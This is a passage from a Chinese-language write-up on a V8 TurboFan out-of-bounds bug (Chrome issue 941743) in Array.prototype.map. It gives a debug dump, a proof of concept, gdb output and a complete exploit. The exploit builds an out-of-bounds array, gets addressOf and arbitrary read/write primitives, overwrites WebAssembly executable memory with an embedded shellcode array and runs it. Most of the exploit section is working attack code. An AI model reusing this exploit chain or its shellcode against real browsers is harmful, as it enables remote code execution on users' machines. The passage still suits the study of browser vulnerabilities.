       - max_number_key: 0
     }
    0x3427e398a9f9: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 32
     - inobject properties: 0
     - elements kind: DICTIONARY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - back pointer: 0x3427e3982fc9 
     - prototype_validity cell: 0x3538bdb00609 
     - instance descriptors (own) #1: 0x1e11fad11e69 
     - layout descriptor: (nil)
     - prototype: 0x1e11fad11081 
     - constructor: 0x1e11fad10e31 
     - dependent code: 0x342395d802c1 
     - construction counter: 0
当`JSCreateArray`返回的是`Dictionary`类型时，V8的优化代码仍然是以数组连续的方式写值的。在就导致了数组溢出。
###  POC
    Array(2**30);
    function opt(a) {
       return a.map((value,index)=>{return value});
    }
    var a = [1,2,3,,,,4];
    for (var i=0;i
###  疑难问题
我们还注意到一个细节，我们的数组是`HOLEY_SMI_ELEMENTS`，首先，`SMI`是为了满足`JSCreateArray`不内联的条件，而`HOLEY`是为了能够溢出方便控制内存，因为空洞的原因，不会对某块区域进行写，从而不至于破坏内存中其他地方，仅去覆盖我们需要的地方。
    var a = [1,2,3,,,,4];
另一个问题是为何要防止`JSCreateArray`内联，首先，我们去除开头的`Array(2**30)`，然后观察IR图。没内联时是这样的
内联以后是这样的，因为内联多了个`CheckBound`，且我们触发漏洞的length显然超过这个范围，这将导致直接`deoptimization
bailout`。
gdb调试如下
    0x00003bbfbc0830fb in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────
     RAX  0x1caece4004d1 ◂— 0x1caece4005
     RBX  0x7fa156f631b0 ◂— push   rbp
     RCX  0x335e74882b69 ◂— 0x21000029b2ef682e
     RDX  0x560d0e592ac0 —▸ 0x560d0e607a30 ◂— 0x1baddead0baddeaf
     RDI  0x29b2ef682e89 ◂— 0x400001caece4001
     RSI  0x3a04229817d9 ◂— 0x1caece400f
     R8   0x2000066
     R9   0x200006600000000
     R10  0x100000000
     R11  0x7fa156b61270 (v8::internal::IncrementalMarking::RetainMaps()) ◂— push   rbp
     R12  0x7fffe6d138b0 —▸ 0x7fffe6d138d8 —▸ 0x7fffe6d13940 —▸ 0x7fffe6d13990 —▸ 0x7fffe6d13cc0 ◂— ...
     R13  0x560d0e588e70 —▸ 0x1caece400751 ◂— 0xde00001caece4004
     R14  0x1caece4005b1 ◂— 0xff00001caece4005
     R15  0x7fffe6d13810 —▸ 0x3bbfbc08304a ◂— jmp    0x3bbfbc082e16
     RBP  0x7fffe6d13848 —▸ 0x7fffe6d138b0 —▸ 0x7fffe6d138d8 —▸ 0x7fffe6d13940 —▸ 0x7fffe6d13990 ◂— ...
     RSP  0x7fffe6d13818 —▸ 0x3a042299f563 ◂— 0x1caece
    *RIP  0x3bbfbc0830fb ◂— mov    r13, 2
    ───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────
       0x3bbfbc082e48    jae    0x3bbfbc082e5c 
        ↓
       0x3bbfbc082e5c    mov    r9, r8
       0x3bbfbc082e5f    shl    r9, 0x20
       0x3bbfbc082e63    cmp    r8d, 0x7ff8
       0x3bbfbc082e6a    jae    0x3bbfbc0830fb 
        ↓
     ► 0x3bbfbc0830fb    mov    r13, 2
       0x3bbfbc083102    call   0x3bbfbc102040 
可以看到，因为`cmp r8d, 0x7ff8`比较不通过导致直接`deoptimization
bailout`了，因此`JSCreateArray`不能内联。
###  exp
通过溢出，覆盖`Array`的length，从而构造一个能自由控制的`oob`数组，然后就很容易利用了，当我们完成构造`oob`数组以后，我们使用`throw`抛出一个异常，从而可以使得`map`函数停止向后的迭代。
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    //使得TurboFan不会将JSCreateArray内联化
    Array(2**30);
    var oob_arr;
    var obj_arr;
    var arr_buf;
    var oob_arr_length_idx = 0x18;
    function opt(arr,flag) {
       return arr.map((value,index)=>{
          if (index == 0) {
             oob_arr = [1.1,2.2,3.3];
             obj_arr = [{}];
             arr_buf = new ArrayBuffer(0x10);
             if (flag) {
                /*%DebugPrint(a);
                %DebugPrint(oob_arr);*/
             }
          } else if (index > oob_arr_length_idx) {
             throw "oob finished!"
          }
          return value;
       });
    }
    //HOLEY_SMI_ELEMENTS的数组
    var a = [1,2,,3];
    for (var i=0;i  3) {
          print("oob success!");
       } else {
          throw "oob failed!";
       }
    }
    //%DebugPrint(oob_arr);
    //%DebugPrint(obj_arr);
    function addressOf(obj) {
       obj_arr[0] = obj;
       return u64f(oob_arr[0x10]) - 0x1n;
    }
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    var wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x100n;
    //%DebugPrint(wasmInstance);
    /*%DebugPrint(oob_arr);
    %DebugPrint(arr_buf);
    */
    oob_arr[0x18] = i2f64(0x100);
    oob_arr[0x19] = i2f64(wasm_shellcode_ptr_addr);
    var adv = new DataView(arr_buf);
    var wasm_shellcode_addr = adv.getBigUint64(0,true);
    print('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
    oob_arr[0x19] = i2f64(wasm_shellcode_addr);
    //替换wasm的shellcode
    for (var i=0;i<shellcode.length;i++) {
       adv.setUint32(i*4,shellcode[i],true);
    }
    //执行shellcode
    func();
## 0x03 感想
通过本次实践，对于V8的知识又增加了，还得不断的学习。
## 0x04 参考
[Array.prototype.map()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map)  
[把握机会之窗：看我如何获得Chrome 1-day漏洞并实现利用](https://zhuanlan.zhihu.com/p/62206287)  
[Chrome M73 issue
941743](https://laptrinhx.com/chrome-m73-issue-941743-2744271499/)